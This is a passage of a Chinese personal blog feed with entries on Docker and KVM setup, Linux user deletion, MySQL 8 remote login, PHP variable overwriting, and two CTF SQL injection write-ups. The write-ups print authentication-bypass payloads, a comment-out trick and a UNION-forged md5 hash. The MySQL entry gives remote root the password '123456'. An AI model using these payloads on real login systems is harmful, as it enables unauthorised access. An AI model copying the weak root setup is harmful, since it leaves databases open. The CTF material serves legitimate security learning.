systemd[1]: Stopped firewalld - dynamic firewall daemon.</code></pre><p>接着完成完成网盘管理员账号的注册，使用默认数据库（当然，也可以起一个<code>Mysql</code>的容器，用来连接），然后完成注册，就可以登录了。<br><img alt data-src="https://image.3001.net/images/20181123/15429718196488.jpg" class="lozad"><br>这样就愉快的搭建完成了，是不是五分钟快速搭建！</p>]]></content>
      
      
      <categories>
          
          <category> Cloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cloud </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KVM使用</title>
      <link href="/2018/10/08/cloud03/"/>
      <url>/2018/10/08/cloud03/</url>
      
        <content type="html"><![CDATA[<p><strong>这里使用的是Ubuntu18.04桌面版虚拟机</strong><br>关于KVM可以看一下我<a href="https://www.cnblogs.com/Timesi/p/9565456.html" target="_blank" rel="noopener">之前的博客</a>,有一些简单的介绍。<br>1.在打开虚拟机之前先开启此虚拟机的虚拟化功能。<br><img alt data-src="https://image.3001.net/images/20181123/15429714916274.jpg" class="lozad"><br>2.安装<code>KVM</code>及其依赖项</p><pre><code>wy@wy-virtual-machine:~$ sudo apt install qemu qemu-kvm libvirt-bin bridge-utils  virt-manager</code></pre><p>3.安装完成后，启用<code>libvirtd服务</code>(默认是开启的)</p><pre><code>wy@wy-virtual-machine:~$ sudo service libvirtd startwy@wy-virtual-machine:~$ sudo update-rc.d libvirtd enable</code></pre><p>4.启动之后查看一下<code>libvirtd服务</code>的运行状态</p><pre><code>wy@wy-virtual-machine:~$ service libvirtd status● libvirtd.service - Virtualization daemonLoaded: loaded (/lib/systemd/system/libvirtd.service; enabled; vendor preset:Active: active (running) since Tue 2018-09-18 18:44:55 CST; 1min 56s ago    Docs: man:libvirtd(8)        https://libvirt.orgMain PID: 6006 (libvirtd)    Tasks: 19 (limit: 32768)CGroup: /system.slice/libvirtd.service        ├─6006 /usr/sbin/libvirtd        ├─6701 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default        └─6702 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default9月 18 18:44:55 wy-virtual-machine systemd[1]: Started Virtualization daemon.9月 18 18:45:00 wy-virtual-machine dnsmasq[6701]: started, version 2.79 cachesiz9月 18 18:45:00 wy-virtual-machine dnsmasq[6701]: compile time options: IPv6 GNU9月 18 18:45:00 wy-virtual-machine dnsmasq-dhcp[6701]: DHCP, IP range 192.168.129月 18 18:45:00 wy-virtual-machine dnsmasq-dhcp[6701]: DHCP, sockets bound exclu9月 18 18:45:00 wy-virtual-machine dnsmasq[6701]: reading /etc/resolv.conf9月 18 18:45:00 wy-virtual-machine dnsmasq[6701]: using nameserver 127.0.0.53#539月 18 18:45:00 wy-virtual-machine dnsmasq[6701]: read /etc/hosts - 7 addresses9月 18 18:45:00 wy-virtual-machine dnsmasq[6701]: read /var/lib/libvirt/dnsmasq/9月 18 18:45:00 wy-virtual-machine dnsmasq-dhcp[6701]: read /var/lib/libvirt/dns</code></pre><p>可以看到正在运行。<br>到此<code>KVM</code>安装完成。</p><hr><p>接着就可以创建虚拟机了，首先通过<code>virt-manager</code>命令打开<code>Virtual Machine Manager</code>。<br><img alt data-src="https://image.3001.net/images/20181123/15429714932785.jpg" class="lozad"><br>然后开始新建虚拟机。<br><img alt data-src="https://image.3001.net/images/20181123/15429714952486.jpg" class="lozad"><br>选择镜像<br><img alt data-src="https://image.3001.net/images/20181123/15429714972102.jpg" class="lozad"><br>配置虚拟机规格<br><img alt data-src="https://image.3001.net/images/20181123/15429714981193.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429715015555.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429715037544.jpg" class="lozad"><br>接着创建<br><img alt data-src="https://image.3001.net/images/20181123/15429715045047.jpg" class="lozad"><br>然后就好啦。<br><img alt data-src="https://image.3001.net/images/20181123/15429715062667.jpg" class="lozad"></p><ul><li><input checked disabled type="checkbox"> 虚拟机中安装虚拟机达成</li></ul>]]></content>
      
      
      <categories>
          
          <category> Cloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cloud </tag>
            
            <tag> 虚拟化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SQL注入1</title>
      <link href="/2018/10/08/CTF-SQL1/"/>
      <url>/2018/10/08/CTF-SQL1/</url>
      
        <content type="html"><![CDATA[<p>题目<br><img alt data-src="https://image.3001.net/images/20190615/15605755361556.jpg" class="lozad"></p><p>访问题目网址<br><img alt data-src="https://image.3001.net/images/20190615/15605756298441.jpg" class="lozad"></p><p>先查看一下源码<br><img alt data-src="https://image.3001.net/images/20190615/15605756914304.jpg" class="lozad"></p><p>仔细分析一下核心源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;      //判断user和pass两个变量不为空</span><br><span class="line">mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);        //连接数据库</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);    //选择要使用的库</span><br><span class="line">  $user = trim($_POST[user]);       //去除输入的user变量两侧的空白字符</span><br><span class="line">  $pass = md5(trim($_POST[pass]));  //去除pass变量两侧空白字符再进行md5加密</span><br><span class="line">  $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;    //根据输入的user和pass构造查询语句</span><br><span class="line">    echo &apos;&lt;/br&gt;&apos;.$sql;  //回显查找语句</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));    //使用构造的查询语句查询数据库并返回结果集</span><br><span class="line">  if($query[user]==&quot;admin&quot;) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if($query[user] != &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;         //判断结果集中的user参数对应的值是不是admin，如果是返回flag，不是则返回 You are not admin!</span><br><span class="line">&#125;</span><br><span class="line">echo $query[user];      //回显查询到的user值</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过分析源码知道了<code>user</code>的值为<code>admin</code>,因为sql查询语句里有and，必须and前后同时成立才可以查询，但是现在不知道<code>pass</code>对应的值，所以考虑能不能不判断pass，直接判断user，于是想到是不是可以将user判断语句闭合并注释后面的内容，这样就不会对pass进行判断，pass就直接输入<code>111</code>，于是构造下面的语句。<br><img alt data-src="https://image.3001.net/images/20190615/15605774891410.jpg" class="lozad"><br>这样的话查询语句就变成了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user from ctf where (user=&apos;admin&apos;) #&apos;) and (pw=&apos;111&apos;)</span><br></pre></td></tr></table></figure><p>尝试提交看看会不会返回flag。<br><img alt data-src="https://image.3001.net/images/20190615/15605783011325.jpg" class="lozad"><br>成功拿到flag</p><blockquote><p>补充：Mysql的注释语句有三种<br>1./**/<br>注释一段内容，这里明显不适用。<br>2.–<br>注释– 后的语句直到行尾，注意这里的–后面要有一个空格，但是题目中使用了trim()函数去除空格，所以也不适用。<br>3.#<br>注释#后的语句直到行尾。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SQL注入2</title>
      <link href="/2018/10/08/CTF-SQL%E6%B3%A8%E5%85%A52/"/>
      <url>/2018/10/08/CTF-SQL%E6%B3%A8%E5%85%A52/</url>
      
        <content type="html"><![CDATA[<p>题目<br><img alt data-src="https://image.3001.net/images/20190615/15605824628676.jpg" class="lozad"></p><p>访问题目网址<br><img alt data-src="https://image.3001.net/images/20190615/15605825721507.jpg" class="lozad"></p><p>还是先查看一下源码<br><img alt data-src="https://image.3001.net/images/20190615/15605833271628.jpg" class="lozad"></p><p>分析核心源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;));</span><br><span class="line">  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>找到最关键的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>解题思路：<br>1.可以看到这里只对密码进行了对比，没有进行user的对比，所以应该考虑怎么使得<code>$query[pw]</code>存在且<code>strcasecmp($pass, $query[pw]))</code>为假。</p><p>2.<code>$query[pw]</code>是MySQL查询结果集中的值，只要MySQL语句返回值即可存在。<br>要使<code>strcasecmp($pass, $query[pw])</code>为假，就要使得<code>$pass</code>的值小于等于<code>$query[pw]</code>（比较ASCII码）。<code>$pass</code>是我们输入值的md5值，<code>$query[pw]</code>是数据库中的正确密码。因为<code>$pass</code>是md5值，32位，而<code>$query[pw]</code>不知道，所以看看能不能将<code>$query[pw]</code>的值构造成我们需要的32位，且大于<code>$pass</code>的值，根据题目的提示，考察union联合查询，尝试构造如下语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select pw from ctf where user=&apos;&apos;union select md5(2)#&apos;</span><br></pre></td></tr></table></figure><p>这个语句的输出因为闭合了user，user为空，查不到任何值，而后面<code>select md5(2)</code>，则会返回2的md5值，所以返回的结果会变成下面这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----------------------------------+</span><br><span class="line">| pw                               |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| c81e728d9d4c2f636f067f89cc14862c |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure><p>这样从<code>$query[pw]</code>查询到的值就会变成2的md5值，这时我密码输入2，这样经过<code>strcasecmp()</code>函数的对比会返回0，达到目的。<br><img alt data-src="https://image.3001.net/images/20190615/15605875962836.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20190615/15605876277562.jpg" class="lozad"><br>成功拿到flag</p><hr><p><strong>补充：</strong><br><strong>1.<code>strcasecmp(str1，str2)</code>函数</strong></p><p><code>strcasecmp(str1，str2)</code>函数返回的结果是比较两个字符串的ASCII码，从第一位开始，相等就比较下一位，如果比较过程中，一旦出现str1的某一个字符的ASCII码和str2的不等，那么将返回这两个字符的ASCII码值之差。<br><img alt data-src="https://image.3001.net/images/20190615/15605881881011.jpg" class="lozad"></p><p><strong>2.union联合查询</strong><br>当使用union联合查询时，前一个select查询的列名将会作为输出结果的列名，后一个select只会返回查询列的内容，而没有列名。</p><p>union前后查询列名一致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from t2;</span><br><span class="line">+----+-------+</span><br><span class="line">| id | score |</span><br><span class="line">+----+-------+</span><br><span class="line">|  1 |    33 |</span><br><span class="line">+----+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from t5;</span><br><span class="line">+-----------+---------+------+</span><br><span class="line">| user      | pw      | id   |</span><br><span class="line">+-----------+---------+------+</span><br><span class="line">| admin     | 000000  | NULL |</span><br><span class="line">| admin2    | 1000000 | NULL |</span><br><span class="line">| gubeiqing | gu      |   10 |</span><br><span class="line">+-----------+---------+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id from t2 union select id from t5;</span><br><span class="line">+------+</span><br><span class="line">| id   |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">| NULL |</span><br><span class="line">|   10 |</span><br><span class="line">+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>union前后查询列名不一致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from t2;</span><br><span class="line">+----+-------+</span><br><span class="line">| id | score |</span><br><span class="line">+----+-------+</span><br><span class="line">|  1 |    33 |</span><br><span class="line">+----+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from t5;</span><br><span class="line">+-----------+---------+------+</span><br><span class="line">| user      | pw      | id   |</span><br><span class="line">+-----------+---------+------+</span><br><span class="line">| admin     | 000000  | NULL |</span><br><span class="line">| admin2    | 1000000 | NULL |</span><br><span class="line">| gubeiqing | gu      |   10 |</span><br><span class="line">+-----------+---------+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id from t2 union select pw from t5;</span><br><span class="line">+---------+</span><br><span class="line">| id      |</span><br><span class="line">+---------+</span><br><span class="line">| 1       |</span><br><span class="line">| 000000  |</span><br><span class="line">| 1000000 |</span><br><span class="line">| gu      |</span><br><span class="line">+---------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>foreach函数</title>
      <link href="/2018/10/08/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98/"/>
      <url>/2018/10/08/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="foreach函数"><a href="#foreach函数" class="headerlink" title="foreach函数"></a>foreach函数</h3><p>PHP中遍历有一个遍历数组的函数–foreach。<br>foreach有两种用法，一种直接遍历数组然后输出值，另一种不光输出值，还输出与值对应的键。</p><p>第一种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$array = array(&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;);</span><br><span class="line">foreach($array as $values)&#123;</span><br><span class="line">    echo $values;</span><br><span class="line">    echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：<br><img alt data-src="https://image.3001.net/images/20190616/15606672129830.jpg" class="lozad"></p><p>第二种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$array = array(&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;);</span><br><span class="line">foreach($array as $key =&gt; $values)&#123;</span><br><span class="line">    echo $key.&quot;-&gt;&quot;.$values;</span><br><span class="line">    echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：<br><img alt data-src="https://image.3001.net/images/20190616/15606674259418.jpg" class="lozad"></p><p>如果是关联数组使用第二种方法就可以输出键值对。</p><p>###变量覆盖</p><p><strong>1.$$变量覆盖</strong><br>举个最简单的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=10;</span><br><span class="line">$array = array(&apos;a&apos;=&gt;1,&apos;b&apos;=&gt;2,&apos;c&apos;=&gt;3);</span><br><span class="line">foreach ($array as $key=&gt;$value)  </span><br><span class="line">&#123;</span><br><span class="line">        $$key = $value;</span><br><span class="line">&#125;</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我先定义了一个变量a并初始化为10，查看一下输出：<br><img alt data-src="https://image.3001.net/images/20190616/1560671487540.jpg" class="lozad"><br>发现输出的结果中，变量a的值变成了1，就是因为变量覆盖。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$array = array(&apos;a&apos;=&gt;1,&apos;b&apos;=&gt;2,&apos;c&apos;=&gt;3);</span><br><span class="line">foreach ($array as $key=&gt;$value)  </span><br><span class="line">&#123;</span><br><span class="line">    $$key = $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这段语句中，<code>foreach ($array as $key=&gt;$value)</code>输出的key应该是<code>a，b,c</code>,输出的value 应该是<code>1,2,3</code>,但是到下一句之后，使用<code>$$key</code>使得原来的<code>a</code>变成了<code>$a</code>，而value的值没有变化，就使得foreach里面的语句变成了<code>$a=1</code>,<code>$b=2</code>,<code>$c=3</code>，这样一来，<code>$a=1</code>就将之前的<code>$a=10</code>，覆盖了，所以输出的结果是<code>$a=1</code>。</p><p><strong>2.extract()变量覆盖</strong><br>源自<a href="http://www.w3school.com.cn/php/func_array_extract.asp" target="_blank" rel="noopener">W3school</a>。</p><p>（1）语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract(array,extract_rules,prefix)</span><br></pre></td></tr></table></figure><p>（2）定义和用法<br>extract() 函数从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。<br>该函数返回成功导入到符号表中的变量数目。</p><p>（3）举例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;Original&quot;;</span><br><span class="line">$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);</span><br><span class="line">extract($my_array);</span><br><span class="line">echo &quot;\$a = $a; \$b = $b; \$c = $c&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：<br><img alt data-src="https://image.3001.net/images/20190616/15606724931566.jpg" class="lozad"><br>可以看到$a原来的值被覆盖。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下完全删除用户</title>
      <link href="/2018/10/08/linux02/"/>
      <url>/2018/10/08/linux02/</url>
      
        <content type="html"><![CDATA[<p><strong>实验环境：Centos7虚拟机</strong><br>首先创建一个普通用户<code>gubeiqing</code>。</p><pre><code>[root@localhost ~]# useradd gubeiqing[root@localhost ~]# passwd gubeiqingChanging password for user gubeiqing.New password:BAD PASSWORD: The password is a palindromeRetype new password:passwd: all authentication tokens updated successfully.</code></pre><p>这样就成功创建了一个普通用户，然后来删除这个用户。</p><pre><code>[root@localhost ~]# userdel gubeiqing[root@localhost ~]#</code></pre><p>使用<code>useradd</code>命令就删除了，但是，，，问题来了，当我们再次创建<code>gubeiqing</code>这个用户时：</p><pre><code>[root@localhost ~]# useradd gubeiqinguseradd: warning: the home directory already exists.Not copying any file from skel directory into it.Creating mailbox file: File exists</code></pre><p>文件已存在，无法创建，这是为什么？因为在创建用户时会默认生成用户的<code>家目录</code>，<code>密码文件</code>，<code>用户组</code>(不指定用户组的情况下)，以及<code>邮箱文件</code>，而使用<code>userdel</code>命令删除时仅仅是删除了这个用户，而这个用户的文件还在，那么就需要完全删除这些文件。我看了一下大概有四个地方需要处理。</p><ul><li>在<code>/home</code>目录下的文件</li><li>在<code>/etc/passwd</code>下的用户</li><li>在<code>/etc/group</code>下的用户组</li><li>在<code>/var/spool/mail</code>下的邮箱文件</li></ul><p>下面依次来删除这些文件。</p><p>#1.删除<code>/home</code>目录下的文件</p><pre><code>[root@localhost ~]# cd /home[root@localhost home]# lsgubeiqing[root@localhost home]# rm -rf gubeiqing[root@localhost home]# ls[root@localhost home]#</code></pre><p>#2.删除<code>/etc/passwd</code>下的用户<br>我们可以查看一下这个文件。</p><pre><code>[root@localhost ~]# cat /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinpolkitd:x:999:997:User for polkitd:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinchrony:x:998:996::/var/lib/chrony:/sbin/nologindockerroot:x:997:994:Docker User:/var/lib/docker:/sbin/nologingubeiqing:x:1000:1000::/home/gubeiqing:/bin/bash</code></pre><p>在这里可以看到这个系统中的所有用户，可以看到最后一行就是刚刚创建的用户，那么使用<code>vi</code>编辑器删除最后一行的用户。</p><p>#3.删除<code>/etc/group</code>下的用户组文件<br>先查看一下这个文件：</p><pre><code>[root@localhost ~]# cat /etc/grouproot:x:0:bin:x:1:daemon:x:2:sys:x:3:adm:x:4:tty:x:5:disk:x:6:lp:x:7:mem:x:8:kmem:x:9:wheel:x:10:cdrom:x:11:mail:x:12:postfixman:x:15:dialout:x:18:floppy:x:19:games:x:20:tape:x:30:video:x:39:ftp:x:50:lock:x:54:audio:x:63:nobody:x:99:users:x:100:utmp:x:22:utempter:x:35:ssh_keys:x:999:input:x:998:systemd-journal:x:190:systemd-network:x:192:dbus:x:81:polkitd:x:997:postdrop:x:90:postfix:x:89:sshd:x:74:chrony:x:996:cgred:x:995:dockerroot:x:994:gubeiqing:x:1000:</code></pre><p>然后使用<code>vi</code>编辑器删除这个用户组。</p><p>#4.删除<code>/var/spool/mail</code>下的邮箱文件</p><pre><code>[root@localhost ~]# cd /var/spool/mail[root@localhost mail]# lsgubeiqing[root@localhost mail]# rm -rf gubeiqing[root@localhost mail]# ls[root@localhost mail]#</code></pre><p>删除完成，再来创建<code>gubeiqing</code>用户。</p><pre><code>[root@localhost mail]# useradd gubeiqing[root@localhost mail]# passwd gubeiqingChanging password for user gubeiqing.New password:BAD PASSWORD: The password is a palindromeRetype new password:passwd: all authentication tokens updated successfully.</code></pre><p>搞定！</p><p><strong>除了这种方法还有一种完全删除的方法。</strong></p><pre><code>[root@localhost mail]# userdel -rf gubeiqing[root@localhost mail]# useradd gubeiqing[root@localhost mail]# passwd gubeiqingChanging password for user gubeiqing.New password:BAD PASSWORD: The password is a palindromeRetype new password:passwd: all authentication tokens updated successfully.</code></pre><p>使用这两种方法就可以完全删除用户。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL用户远程登录问题</title>
      <link href="/2018/10/08/mysql04/"/>
      <url>/2018/10/08/mysql04/</url>
      
        <content type="html"><![CDATA[<p>今天来水一篇，差点被这个远程登录搞死了，所以记录下这个问题。</p><p>先使用<code>status</code>命令查看一下<code>MySQL</code>版本，这里可以可以看到我用的是是<code>8.0.12</code>版本。</p><pre><code>mysql&gt; status--------------mysql  Ver 8.0.12 for Linux on x86_64 (MySQL Community Server - GPL)Connection id:          14Current database:       testCurrent user:           root@localhostSSL:                    Not in useCurrent pager:          stdoutUsing outfile:          &apos;&apos;Using delimiter:        ;Server version:         8.0.12 MySQL Community Server - GPLProtocol version:       10Connection:             Localhost via UNIX socketServer characterset:    utf8mb4Db     characterset:    utf8mb4Client characterset:    latin1Conn.  characterset:    latin1UNIX socket:            /var/run/mysqld/mysqld.sockUptime:                 25 min 14 secThreads: 3  Questions: 201  Slow queries: 0  Opens: 333  Flush tables: 2  Open tables: 309  Queries per second avg: 0.132--------------</code></pre><p>如果什么都不设置，那么用PHP连接时会报错：</p><pre><code>Warning: mysqli::__construct(): The server requested authentication method unknown to the client [caching_sha2_password]Warning: mysqli::__construct(): (HY000/2054): The server requested authentication method unknown to the client</code></pre><p><code>caching_sha2_password</code>报错是因为加密规则的原因。</p><p>可以在<code>mysql</code>数据库下查看相关信息。</p><pre><code>mysql&gt; use mysql;mysql&gt; select host, user, authentication_string, plugin from user; </code></pre><p><strong>解决方法</strong></p><p>首先修改远程用户加密规则</p><pre><code>mysql&gt; ALTER USER &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos; PASSWORD EXPIRE NEVER;Query OK, 0 rows affected (0.03 sec)</code></pre><p>然后更新密码</p><pre><code>mysql&gt; ALTER USER &apos;root&apos;@&apos;%&apos; IDENTIFIED WITH mysql_native_password BY &apos;123456&apos;;Query OK, 0 rows affected (0.08 sec)</code></pre><p>刷新权限</p><pre><code>mysql&gt; flush privileges;Query OK, 0 rows affected (0.01 